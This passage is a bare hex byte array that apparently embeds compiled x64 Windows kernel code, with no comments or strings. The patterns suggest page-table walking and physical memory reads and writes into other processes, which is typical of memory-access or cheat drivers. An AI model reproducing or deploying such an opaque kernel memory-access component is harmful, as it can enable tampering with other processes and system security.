    0x00, 0x00, 0x73, 0x5E, 0x49, 0x89, 0xD6, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00,
    0x89, 0xF8, 0x48, 0x89, 0x44, 0x24, 0x38, 0x4C, 0x8D, 0x2C, 0xC2, 0x4C, 0x8D, 0x7C, 0x24, 0x30,
    0x41, 0x89, 0xFC, 0x31, 0xED, 0xEB, 0x15, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x41, 0xFF, 0xC4, 0x49, 0x83, 0xC5, 0x08, 0x44, 0x39, 0xE3, 0x74, 0x7A, 0x41, 0xB8, 0x08, 0x00,
    0x00, 0x00, 0x4C, 0x89, 0xE9, 0x4C, 0x89, 0xFA, 0x45, 0x31, 0xC9, 0xE8, 0x00, 0x03, 0x00, 0x00,
    0x85, 0xC0, 0x78, 0x2C, 0xF6, 0x44, 0x24, 0x30, 0x01, 0x75, 0xD5, 0xFF, 0xC5, 0x89, 0x6E, 0x04,
    0xEB, 0xCE, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xF4, 0x59, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0x7A, 0x53, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x47, 0x55, 0x00, 0x00, 0x41, 0x89, 0xF9, 0xEB, 0x1C,
    0x89, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x60, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x5C, 0x53,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0x29, 0x55, 0x00, 0x00, 0x45, 0x89, 0xE1, 0xFF, 0x15, 0x26, 0x68,
    0x00, 0x00, 0x48, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x48, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41,
    0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x85, 0xED, 0x0F, 0x84, 0x85, 0x00, 0x00, 0x00, 0x80, 0x3D,
    0x5B, 0x13, 0x04, 0x00, 0x00, 0x75, 0x24, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0xFF, 0x15, 0x4E, 0x67,
    0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x33, 0x4C, 0x24, 0x40, 0xFF, 0x15,
    0x24, 0x68, 0x00, 0x00, 0xC6, 0x05, 0x35, 0x13, 0x04, 0x00, 0x01, 0xFF, 0x15, 0x0F, 0x68, 0x00,
    0x00, 0x31, 0xD2, 0xF7, 0xF5, 0x41, 0x89, 0xD7, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x4D, 0x8D, 0x34,
    0xC6, 0x4C, 0x8D, 0x64, 0x24, 0x30, 0x45, 0x31, 0xED, 0xEB, 0x0F, 0x0F, 0x1F, 0x44, 0x00, 0x00,
    0xFF, 0xC7, 0x49, 0x83, 0xC6, 0x08, 0x39, 0xFB, 0x74, 0x49, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00,
    0x4C, 0x89, 0xF1, 0x4C, 0x89, 0xE2, 0x45, 0x31, 0xC9, 0xE8, 0x22, 0x02, 0x00, 0x00, 0x85, 0xC0,
    0x78, 0x21, 0xF6, 0x44, 0x24, 0x30, 0x01, 0x75, 0xD7, 0x45, 0x39, 0xFD, 0x74, 0x45, 0x41, 0xFF,
    0xC5, 0xEB, 0xCD, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xD4, 0x58, 0x00, 0x00, 0xE9, 0x1A,
    0xFF, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x3F, 0x4E, 0x00, 0x00, 0xE9, 0x0A,
    0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x0D, 0x9B, 0x59, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x7D, 0x52, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0x4A, 0x54, 0x00, 0x00, 0xFF, 0x15, 0x4A, 0x67, 0x00, 0x00, 0xE9, 0x1F,
    0xFF, 0xFF, 0xFF, 0x89, 0x3E, 0xC6, 0x46, 0x08, 0x01, 0x89, 0x7C, 0x24, 0x20, 0x48, 0x8D, 0x0D,
    0x71, 0x31, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x59, 0x52, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x20, 0x54,
    0x00, 0x00, 0x41, 0x89, 0xE9, 0xE9, 0xF2, 0xFE, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x84, 0xC9, 0xB8, 0x00, 0x01, 0x00, 0x00, 0xB9, 0x64, 0x00, 0x00, 0x00, 0x0F, 0x45, 0xC8, 0x41,
    0xBA, 0xFF, 0x01, 0x00, 0x00, 0x44, 0x0F, 0x44, 0xD0, 0x48, 0x8D, 0x05, 0x81, 0x41, 0x00, 0x00,
    0x4C, 0x8D, 0x1D, 0xF1, 0x45, 0x00, 0x00, 0x4C, 0x0F, 0x45, 0xD8, 0x89, 0x0A, 0x45, 0x89, 0x10,
    0x4D, 0x89, 0x19, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x44, 0x89, 0xC7, 0x89, 0xD3, 0x89, 0xCE, 0xFF, 0xCF,
    0xFF, 0x15, 0xFA, 0x66, 0x00, 0x00, 0x8D, 0x88, 0xFF, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x49,
    0xC8, 0x81, 0xE1, 0x00, 0xFE, 0xFF, 0xFF, 0x29, 0xC8, 0x31, 0xC9, 0x83, 0xFF, 0x02, 0x48, 0x63,
    0xD0, 0x0F, 0x92, 0xC1, 0x8D, 0x0C, 0xC9, 0x83, 0xC1, 0x15, 0x48, 0xD3, 0xE2, 0x48, 0xC1, 0xE6,
    0x27, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x48, 0x09, 0xF0, 0x84, 0xDB,
    0x48, 0x0F, 0x44, 0xC6, 0x48, 0x09, 0xD0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5F, 0x5E, 0xC3, 0xCC,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0xB9, 0x00, 0x10, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0x15, 0x97, 0x64, 0x00, 0x00, 0x48, 0x89, 0x05, 0xB8, 0x11, 0x04, 0x00,
    0x48, 0x85, 0xC0, 0x0F, 0x84, 0x95, 0x00, 0x00, 0x00, 0x48, 0xBB, 0x00, 0xF0, 0xFF, 0xFF, 0xFF,
    0xFF, 0x0F, 0x00, 0x41, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xC1, 0x31, 0xD2, 0xFF, 0x15,
    0x44, 0x66, 0x00, 0x00, 0x48, 0x8B, 0x3D, 0x8D, 0x11, 0x04, 0x00, 0xE8, 0x60, 0x0F, 0x00, 0x00,
    0x48, 0x21, 0xD8, 0x48, 0x89, 0xC1, 0xFF, 0x15, 0x64, 0x64, 0x00, 0x00, 0x48, 0x89, 0xF9, 0x48,
    0xC1, 0xE9, 0x24, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48, 0x8B, 0x0C, 0x08, 0xF6, 0xC1, 0x01,
    0x74, 0x45, 0x48, 0x21, 0xD9, 0xFF, 0x15, 0x45, 0x64, 0x00, 0x00, 0x48, 0x89, 0xF9, 0x48, 0xC1,
    0xE9, 0x1B, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48, 0x8B, 0x0C, 0x08, 0xF6, 0xC1, 0x01, 0x74,
    0x26, 0xBE, 0x0D, 0x00, 0x00, 0xC0, 0x84, 0xC9, 0x78, 0x29, 0x48, 0x21, 0xD9, 0xFF, 0x15, 0x1D,
    0x64, 0x00, 0x00, 0x89, 0xF9, 0xC1, 0xE9, 0x15, 0x81, 0xE1, 0xFF, 0x01, 0x00, 0x00, 0x48, 0x8B,
    0x0C, 0xC8, 0xF6, 0xC1, 0x01, 0x75, 0x16, 0xBE, 0x25, 0x02, 0x00, 0xC0, 0xEB, 0x05, 0xBE, 0x9A,
    0x00, 0x00, 0xC0, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5F, 0x5E, 0xC3, 0x84, 0xC9, 0x78,
    0xF2, 0x48, 0x21, 0xD9, 0xFF, 0x15, 0xE6, 0x63, 0x00, 0x00, 0xC1, 0xEF, 0x0C, 0x81, 0xE7, 0xFF,
    0x01, 0x00, 0x00, 0xF6, 0x04, 0xF8, 0x01, 0xBE, 0x25, 0x02, 0x00, 0xC0, 0x74, 0xD5, 0x48, 0x8D,
    0x04, 0xF8, 0x48, 0x89, 0x05, 0xE7, 0x10, 0x04, 0x00, 0x31, 0xF6, 0xEB, 0xC6, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x38, 0x4C, 0x89, 0xC7, 0x48,
    0x89, 0xD3, 0x48, 0x89, 0xCE, 0x48, 0x85, 0xC9, 0x74, 0x27, 0x48, 0x85, 0xDB, 0x74, 0x22, 0x48,
    0x85, 0xFF, 0x74, 0x1D, 0x44, 0x89, 0xCD, 0x48, 0x89, 0xF1, 0xE8, 0xA1, 0x0C, 0x00, 0x00, 0x84,
    0xC0, 0x75, 0x4C, 0x40, 0x84, 0xED, 0x75, 0x47, 0x48, 0x8D, 0x0D, 0xB3, 0x28, 0x00, 0x00, 0xEB,
    0x11, 0x48, 0x89, 0x7C, 0x24, 0x28, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xCF, 0x29,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0x45, 0x50, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xB6, 0x32, 0x00, 0x00,
    0x49, 0x89, 0xF1, 0xFF, 0x15, 0x0F, 0x65, 0x00, 0x00, 0x41, 0xBF, 0x01, 0x00, 0x00, 0xC0, 0x44,
    0x89, 0xF8, 0x48, 0x83, 0xC4, 0x38, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x41,
    0x89, 0xF6, 0x41, 0x81, 0xE6, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x50, 0x10, 0x04, 0x00,
    0x48, 0xB9, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, 0x48, 0x21, 0xF1, 0x48, 0xBA, 0xFF,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0xF0, 0xFF, 0x48, 0x23, 0x10, 0x48, 0x09, 0xCA, 0x48, 0x89, 0x10,
    0xB1, 0x01, 0xB2, 0x01, 0xFF, 0x15, 0x56, 0x62, 0x00, 0x00, 0xFF, 0x15, 0x58, 0x62, 0x00, 0x00,
    0x48, 0x8B, 0x0D, 0x11, 0x10, 0x04, 0x00, 0x45, 0x31, 0xFF, 0x31, 0xD2, 0x41, 0xB8, 0x01, 0x00,
    0x00, 0x00, 0xFF, 0x15, 0x30, 0x62, 0x00, 0x00, 0x4C, 0x03, 0x35, 0xF9, 0x0F, 0x04, 0x00, 0x4C,
    0x89, 0xF1, 0xE8, 0x39, 0x0C, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x27, 0x40, 0x84, 0xED, 0x75, 0x22,
    0x48, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xAF, 0x54, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x9B,
    0x4F, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x0C, 0x32, 0x00, 0x00, 0x4D, 0x89, 0xF1, 0xE9, 0x51, 0xFF,
    0xFF, 0xFF, 0x48, 0x89, 0xD9, 0x4C, 0x89, 0xF2, 0x49, 0x89, 0xF8, 0xFF, 0x15, 0x5F, 0x64, 0x00,
    0x00, 0xE9, 0x49, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x38, 0x4C, 0x89, 0xC7, 0x48,
    0x89, 0xD3, 0x48, 0x89, 0xCE, 0x48, 0x85, 0xC9, 0x74, 0x27, 0x48, 0x85, 0xDB, 0x74, 0x22, 0x48,
    0x85, 0xFF, 0x74, 0x1D, 0x44, 0x89, 0xCD, 0x48, 0x89, 0xF1, 0xE8, 0x71, 0x0B, 0x00, 0x00, 0x84,
    0xC0, 0x75, 0x4C, 0x40, 0x84, 0xED, 0x75, 0x47, 0x48, 0x8D, 0x0D, 0x83, 0x27, 0x00, 0x00, 0xEB,
    0x11, 0x48, 0x89, 0x7C, 0x24, 0x28, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x9F, 0x28,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0x15, 0x4F, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x6F, 0x31, 0x00, 0x00,
    0x49, 0x89, 0xF1, 0xFF, 0x15, 0xDF, 0x63, 0x00, 0x00, 0x41, 0xBF, 0x01, 0x00, 0x00, 0xC0, 0x44,
    0x89, 0xF8, 0x48, 0x83, 0xC4, 0x38, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x41,
    0x89, 0xF6, 0x41, 0x81, 0xE6, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x20, 0x0F, 0x04, 0x00,
    0x48, 0xB9, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, 0x48, 0x21, 0xF1, 0x48, 0xBA, 0xFF,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0xF0, 0xFF, 0x48, 0x23, 0x10, 0x48, 0x09, 0xCA, 0x48, 0x89, 0x10,
    0xB1, 0x01, 0xB2, 0x01, 0xFF, 0x15, 0x26, 0x61, 0x00, 0x00, 0xFF, 0x15, 0x28, 0x61, 0x00, 0x00,
    0x48, 0x8B, 0x0D, 0xE1, 0x0E, 0x04, 0x00, 0x45, 0x31, 0xFF, 0x31, 0xD2, 0x41, 0xB8, 0x01, 0x00,
    0x00, 0x00, 0xFF, 0x15, 0x00, 0x61, 0x00, 0x00, 0x4C, 0x03, 0x35, 0xC9, 0x0E, 0x04, 0x00, 0x4C,
    0x89, 0xF1, 0xE8, 0x09, 0x0B, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x27, 0x40, 0x84, 0xED, 0x75, 0x22,
    0x48, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x7F, 0x53, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x6B,
    0x4E, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xC5, 0x30, 0x00, 0x00, 0x4D, 0x89, 0xF1, 0xE9, 0x51, 0xFF,
    0xFF, 0xFF, 0x4C, 0x89, 0xF1, 0x48, 0x89, 0xDA, 0x49, 0x89, 0xF8, 0xFF, 0x15, 0x2F, 0x63, 0x00,
    0x00, 0xE9, 0x49, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x89, 0xD6, 0x48, 0x83, 0xE1, 0xF0, 0x48, 0xC7,
    0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD0, 0x48, 0xC1, 0xE8, 0x24, 0x25, 0xF8,
    0x0F, 0x00, 0x00, 0x48, 0x01, 0xC1, 0x31, 0xFF, 0x48, 0x8D, 0x54, 0x24, 0x38, 0x41, 0xB8, 0x08,
    0x00, 0x00, 0x00, 0x45, 0x31, 0xC9, 0xE8, 0x65, 0xFD, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x38,
    0xA8, 0x01, 0x0F, 0x84, 0xFA, 0x00, 0x00, 0x00, 0x48, 0xBB, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0x21, 0xD8, 0x48, 0x89,
    0xF1, 0x48, 0xC1, 0xE9, 0x1B, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48, 0x09, 0xC1, 0x31, 0xFF,
    0x48, 0x8D, 0x54, 0x24, 0x30, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x45, 0x31, 0xC9, 0xE8, 0x1D,
    0xFD, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x30, 0xA8, 0x01, 0x0F, 0x84, 0xB2, 0x00, 0x00, 0x00,
    0x84, 0xC0, 0x0F, 0x88, 0x83, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00,
    0x00, 0x48, 0x21, 0xD8, 0x89, 0xF1, 0xC1, 0xE9, 0x12, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48,
    0x09, 0xC1, 0x31, 0xFF, 0x48, 0x8D, 0x54, 0x24, 0x28, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x45,
    0x31, 0xC9, 0xE8, 0xD9, 0xFC, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x28, 0xA8, 0x01, 0x74, 0x72,
    0x84, 0xC0, 0x78, 0x5F, 0x89, 0xF7, 0x81, 0xE7, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24,
    0x20, 0x00, 0x00, 0x00, 0x00, 0x48, 0x21, 0xD8, 0xC1, 0xEE, 0x09, 0x81, 0xE6, 0xF8, 0x0F, 0x00,
    0x00, 0x48, 0x09, 0xC6, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48,
    0x89, 0xF1, 0x45, 0x31, 0xC9, 0xE8, 0x96, 0xFC, 0xFF, 0xFF, 0x48, 0x23, 0x5C, 0x24, 0x20, 0x48,
    0x09, 0xDF, 0x48, 0x85, 0xDB, 0x48, 0x0F, 0x44, 0xFB, 0xEB, 0x27, 0x48, 0xB9, 0x00, 0x00, 0x00,
    0xC0, 0xFF, 0xFF, 0x0F, 0x00, 0x48, 0x21, 0xC8, 0x81, 0xE6, 0xFF, 0xFF, 0xFF, 0x3F, 0x48, 0x09,
    0xC6, 0xEB, 0x0C, 0x48, 0x21, 0xD8, 0x81, 0xE6, 0xFF, 0xFF, 0x1F, 0x00, 0x48, 0x01, 0xC6, 0x48,
    0x89, 0xF7, 0x48, 0x89, 0xF8, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0x41, 0x28, 0x48, 0x85, 0xC0, 0x74, 0x01, 0xC3, 0x48, 0x8B, 0x81, 0x58, 0x01, 0x00,
    0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x28,
    0x4D, 0x85, 0xC9, 0x0F, 0x84, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xCE, 0x48, 0x85, 0xC9, 0x0F,
    0x84, 0xC4, 0x00, 0x00, 0x00, 0x49, 0x89, 0xD6, 0x48, 0x85, 0xD2, 0x0F, 0x84, 0xB8, 0x00, 0x00,
    0x00, 0x4C, 0x89, 0xC3, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xAC, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xCF,
    0x48, 0x89, 0xF1, 0xFF, 0x15, 0xFF, 0x5F, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xBA, 0x00, 0x00,
    0x00, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0xFE, 0x5F, 0x00, 0x00, 0x3D, 0x03, 0x01, 0x00, 0x00, 0x0F,
    0x85, 0xAF, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x7E, 0x28, 0x4D, 0x85, 0xFF, 0x75, 0x10, 0x4C, 0x8B,
    0xBE, 0x58, 0x01, 0x00, 0x00, 0x4D, 0x85, 0xFF, 0x0F, 0x84, 0x07, 0x01, 0x00, 0x00, 0x45, 0x31,
    0xED, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x4F, 0x8D, 0x24, 0x2E, 0x4C, 0x89, 0xF9, 0x4C, 0x89, 0xE2, 0xE8, 0xF1, 0xFD, 0xFF, 0xFF, 0x48,
    0x85, 0xC0, 0x0F, 0x84, 0x9A, 0x00, 0x00, 0x00, 0x89, 0xC1, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00,
    0x41, 0xBC, 0x00, 0x10, 0x00, 0x00, 0x49, 0x29, 0xCC, 0x49, 0x39, 0xFC, 0x4C, 0x0F, 0x43, 0xE7,
    0x4A, 0x8D, 0x14, 0x2B, 0x48, 0x89, 0xC1, 0x4D, 0x89, 0xE0, 0x45, 0x31, 0xC9, 0xE8, 0x5E, 0xFB,
    0xFF, 0xFF, 0x85, 0xC0, 0x0F, 0x88, 0x8D, 0x00, 0x00, 0x00, 0x4D, 0x01, 0xE5, 0x4C, 0x29, 0xE7,
    0x75, 0xAE, 0x31, 0xED, 0xE9, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x32, 0x30, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0xD7, 0x4B, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x5D, 0x1C, 0x00, 0x00, 0xFF, 0x15,
    0xA4, 0x60, 0x00, 0x00, 0xBD, 0x0D, 0x00, 0x00, 0xC0, 0xEB, 0x67, 0x48, 0x8D, 0x0D, 0xC4, 0x35,
    0x00, 0x00, 0xEB, 0x10, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0x33, 0x5F, 0x00, 0x00, 0x48, 0x8D, 0x0D,
    0xFE, 0x3B, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xA3, 0x4B, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x29, 0x1C,
    0x00, 0x00, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0x6D, 0x60, 0x00, 0x00, 0xBD, 0x0A, 0x01, 0x00, 0xC0,
    0xEB, 0x30, 0x48, 0x8D, 0x0D, 0x6F, 0x22, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x7E, 0x4B, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x04, 0x1C, 0x00, 0x00, 0x4D, 0x89, 0xE1, 0xFF, 0x15, 0x48, 0x60, 0x00, 0x00,
    0xBD, 0x25, 0x02, 0x00, 0xC0, 0xEB, 0x02, 0x89, 0xC5, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0xDE, 0x5E,
    0x00, 0x00, 0x89, 0xE8, 0x48, 0x83, 0xC4, 0x28, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D,
    0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0xC2, 0x5E, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0x83, 0x35, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x32, 0x4B, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xB8,
    0x1B, 0x00, 0x00, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0xFC, 0x5F, 0x00, 0x00, 0xBD, 0x25, 0x02, 0x00,
    0xC0, 0xEB, 0xBF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x28,
    0x4D, 0x85, 0xC9, 0x0F, 0x84, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xCE, 0x48, 0x85, 0xC9, 0x0F,
    0x84, 0xC4, 0x00, 0x00, 0x00, 0x49, 0x89, 0xD6, 0x48, 0x85, 0xD2, 0x0F, 0x84, 0xB8, 0x00, 0x00,
    0x00, 0x4C, 0x89, 0xC3, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xAC, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xCF,
    0x48, 0x89, 0xF1, 0xFF, 0x15, 0x3F, 0x5E, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xBA, 0x00, 0x00,
    0x00, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0x3E, 0x5E, 0x00, 0x00, 0x3D, 0x03, 0x01, 0x00, 0x00, 0x0F,
    0x85, 0xAF, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x7E, 0x28, 0x4D, 0x85, 0xFF, 0x75, 0x10, 0x4C, 0x8B,
    0xBE, 0x58, 0x01, 0x00, 0x00, 0x4D, 0x85, 0xFF, 0x0F, 0x84, 0x07, 0x01, 0x00, 0x00, 0x45, 0x31,
    0xED, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x4F, 0x8D, 0x24, 0x2E, 0x4C, 0x89, 0xF9, 0x4C, 0x89, 0xE2, 0xE8, 0x31, 0xFC, 0xFF, 0xFF, 0x48,
    0x85, 0xC0, 0x0F, 0x84, 0x9A, 0x00, 0x00, 0x00, 0x89, 0xC1, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00,
    0x41, 0xBC, 0x00, 0x10, 0x00, 0x00, 0x49, 0x29, 0xCC, 0x49, 0x39, 0xFC, 0x4C, 0x0F, 0x43, 0xE7,
    0x4A, 0x8D, 0x14, 0x2B, 0x48, 0x89, 0xC1, 0x4D, 0x89, 0xE0, 0x45, 0x31, 0xC9, 0xE8, 0xCE, 0xFA,
    0xFF, 0xFF, 0x85, 0xC0, 0x0F, 0x88, 0x8D, 0x00, 0x00, 0x00, 0x4D, 0x01, 0xE5, 0x4C, 0x29, 0xE7,
    0x75, 0xAE, 0x31, 0xED, 0xE9, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x72, 0x2E, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0x17, 0x4A, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x88, 0x1A, 0x00, 0x00, 0xFF, 0x15,
    0xE4, 0x5E, 0x00, 0x00, 0xBD, 0x0D, 0x00, 0x00, 0xC0, 0xEB, 0x67, 0x48, 0x8D, 0x0D, 0x04, 0x34,
    0x00, 0x00, 0xEB, 0x10, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0x73, 0x5D, 0x00, 0x00, 0x48, 0x8D, 0x0D,
    0x3E, 0x3A, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xE3, 0x49, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x54, 0x1A,
    0x00, 0x00, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0xAD, 0x5E, 0x00, 0x00, 0xBD, 0x0A, 0x01, 0x00, 0xC0,
    0xEB, 0x30, 0x48, 0x8D, 0x0D, 0xAF, 0x20, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xBE, 0x49, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x2F, 0x1A, 0x00, 0x00, 0x4D, 0x89, 0xE1, 0xFF, 0x15, 0x88, 0x5E, 0x00, 0x00,
    0xBD, 0x25, 0x02, 0x00, 0xC0, 0xEB, 0x02, 0x89, 0xC5, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0x1E, 0x5D,
    0x00, 0x00, 0x89, 0xE8, 0x48, 0x83, 0xC4, 0x28, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D,
    0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0x02, 0x5D, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0xC3, 0x33, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x72, 0x49, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xE3,
    0x19, 0x00, 0x00, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0x3C, 0x5E, 0x00, 0x00, 0xBD, 0x25, 0x02, 0x00,
    0xC0, 0xEB, 0xBF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x89,
